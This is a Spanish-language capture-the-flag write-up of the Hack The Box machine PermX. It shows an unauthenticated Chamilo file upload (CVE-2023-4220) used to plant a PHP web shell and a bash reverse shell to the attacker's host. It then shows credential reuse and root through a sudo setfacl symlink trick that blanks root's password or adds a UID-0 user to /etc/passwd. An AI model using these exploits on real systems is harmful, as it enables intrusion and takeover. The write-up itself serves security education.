

![1](</Writeups/Maquinas/Permx/img/logo.png>)
By Rug4lo

## Reconocimiento

Primero que todo vamos a empezar con el reconocimiento de la maquina:

Vamos a escanear los puertos de esta con Nmap:

```bash
❯ nmap -sCV -p22,80 -oN Targeted 10.10.11.23

Nmap scan report for permx.htb (10.10.11.23)
Host is up (0.051s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: eLEARNING
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul  6 21:05:13 2024 -- 1 IP address (1 host up) scanned in 8.41 seconds
```
Podemos comprobar que únicamente hay 2 puertos, viendo las versiones no parecen vulnerables así que vamos a inspeccionar la pagina web en el puerto 80

Podemos lanzar un Watweb, un gobuster y veremos que no nos reporta nada, pero si escaneamos los subdominios encontraremos uno muy interesante
```bash
❯ wfuzz -c --hc=403,400 --hw=26 -t 20 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.permx.htb" http://permx.htb

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://permx.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000001:   200        586 L    2466 W     36182 Ch    "www"                                                                                                                  
000000477:   200        352 L    940 W      19347 Ch    "lms"
```

Ese lms.permx.htb es muy interesante, por lo que lo pondremos en el /etc/hosts y procederemos a ver que hay

Podemos ver que este subdominio tiene un login, y pinta a que es un Chamilo

![1](</Writeups/Maquinas/Permx/img/1.png>)

Podemos probar varias credenciales típicas como admin:admin pero veremos que no nos funcionaran, por lo que podemos empezar a buscar algún CVE para Chamilo, alguno que sea sin autenticacion

## Unauthenticated Upload File - Remote Code Execution

Después de buscar encontré el CVE-2023-4220, con el que se pueden subir archivos sin necesidad de autenticarnos

CVE --> https://starlabs.sg/advisories/23/23-4220/

Siguiendo los pasos de este CVE primero creo el archivo PHP malicioso
```bash
❯ echo '<?php system($_GET["cmd"]); ?>' > rce.php
```
Subimos en archivo en la maquina victima 
```bash
❯ curl -F 'bigUploadFile=@rce.php' 'http://<chamilo>/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'

The file has successfully been uploaded.%
```
Y accedemos a este para ejecutar el comando (en este caso un id)
```bash
❯ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php?cmd=id'

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Ahora que hemos comprobado que tenemos ejecución de comandos podemos lanzarnos la reverse shell (antes poniéndonos en escucha con net-cat `nc -nlvp 4444`
```bash
❯ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.14.21/4444%200%3E%261%22'
```
## De www-data a mtz

Perfecto, tenemos la reverse shell, pero aun no podemos conseguir la flag del usuario, así que como vemos que el usuario al que tenemos que escalar se llama mtz vamos a intentar buscar credenciales para este en algún archivo de configuración

Vemos que en /var/www/chamilo hay un /app y dentro de este un /config, en estos archivos de configuración es muy típico encontrarte credenciales hardcodeadas de usuarios o bases de datos, por lo que vamos a meternos en ese directorio y filtrar por la palabra pass
```bash
❯ cat * | grep "pass"
```
![1](</Writeups/Maquinas/Permx/img/2.png>)


Tenemos la contraseña de la base de datos, pero en entornos como estos se suelen reutilizar las contraseñas, por lo que vale la pena probar a ver si es la contraseña del usuario mtz

![1](</Writeups/Maquinas/Permx/img/3.png>)


Efectivamente es la contraseña del usuario y podemos ya acceder a la user flag

## Escalada de privilegios

Podemos empezar a enumerar para escalar los privilegios, primero vemos a ver si tenemos algún permiso como especificado con sudo
```bash
❯ sudo -l

Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```
Vemos que podemos ejecutar el script /opt/acl.sh como administrador, vale, vamos a ver que el lo que contiene!

Si le hacemos un cat veremos el contenido de este archivo, el cual se divide en varias partes
- Primero comprueba que le has puesto 3 argumentos y define las variables con esa información
- Después Comprueba que el parámetro la ruta especificada este dentro del home de mtz
- La ultima comprobación es para asegurarse de que es un archivo y no un directorio
- Finalmente al terminar las comprobaciones usa el comando setfacl para dar los permisos especificados a el archivo en cuestion
```bash
❯ cat /opt/acl.sh

#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```
Con esto entendido podemos pasar a explotarlo, si buscamos información de setfacl podremos ver que no se puede cambiar el usuario propietario de un archivo a su vez tampoco se puede poner permisos SUID, por lo que nos podemos olvidar de modificar el binario de la bash, pero si que cambia el resto de permisos, por lo que podemos intentar crear un link simbólico en el home el usuario mtz (para que el script se ejecute) hacia el archivo que queramos leer o modificar, para posteriormente darle permisos y ser capaz de leerlo o modificarlo

Paso a paso seria, crear el link simbólico a el archivo que queramos modificar (en este caso el /etc/ porque esta el shadow y el passwd)
```bash
❯ ln -s '/etc/' link
```
Con el link simbólico podemos ya cambiar los permisos del archivo que queramos, en este caso los voy a cambiar del etc/shadow
```bash
❯ sudo /opt/acl.sh mtz rwx /home/mtz/link/shadow
```
Con esto podemos acceder al etc shadow y quitar la contraseña del root  (así se vera el archivo)
```bash
❯ cat /etc/shadow

root::19742:0:99999:7:::
daemon:*:19579:0:99999:7:::
bin:*:19579:0:99999:7:::
sys:*:19579:0:99999:7:::
sync:*:19579:0:99999:7:::
games:*:19579:0:99999:7:::
man:*:19579:0:99999:7:::
lp:*:19579:0:99999:7:::
mail:*:19579:0:99999:7:::
news:*:19579:0:99999:7:::
uucp:*:19579:0:99999:7:::
proxy:*:19579:0:99999:7:::
www-data:*:19579:0:99999:7:::
backup:*:19579:0:99999:7:::
list:*:19579:0:99999:7:::
irc:*:19579:0:99999:7:::
gnats:*:19579:0:99999:7:::
nobody:*:19579:0:99999:7:::
_apt:*:19579:0:99999:7:::
systemd-network:*:19579:0:99999:7:::
systemd-resolve:*:19579:0:99999:7:::
messagebus:*:19579:0:99999:7:::
systemd-timesync:*:19579:0:99999:7:::
pollinate:*:19579:0:99999:7:::
sshd:*:19579:0:99999:7:::
syslog:*:19579:0:99999:7:::
uuidd:*:19579:0:99999:7:::
tcpdump:*:19579:0:99999:7:::
tss:*:19579:0:99999:7:::
landscape:*:19579:0:99999:7:::
fwupd-refresh:*:19579:0:99999:7:::
usbmux:*:19742:0:99999:7:::
mtz:$y$j9T$RUjBgvOODKC9hyu5u7zCt0$Vf7nqZ4umh3s1N69EeoQ4N5zoid6c2SlGb1LvBFRxSB:19742:0:99999:7:::
lxd:!:19742::::::
mysql:!:19742:0:99999:7:::
```
Ahora que el root no tiene contraseña podemos hacer un sudo root, seremos root sin necesidad de poner la contraseña y podremos ver la root flag

## Root alternativo

Otro método sin cambiar el /etc/shadow seria añadir un usuario al /etc/passwd

Para esto podemos hacer lo mismo de antes y dar permisos a un archivo, pero esta vez al /etc/passwd
```bash
❯ sudo /opt/acl.sh mtz rwx /home/mtz/f/etc/passwd
```
Cuando este tenga permisos podremos añadir una linea nueva al archivo, creando un usuario con permisos de administrador con la contraseña que nosotros queramos 
-  El `Fdzt.eqJQ4s0g` es la contraseña encriptada, sin encriptar sera `w00t`
```bash
❯ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```
Ahora simplemente nos autenticamos como root2 y ponemos la contraseña que hemos creado
```bash
❯ su root2
```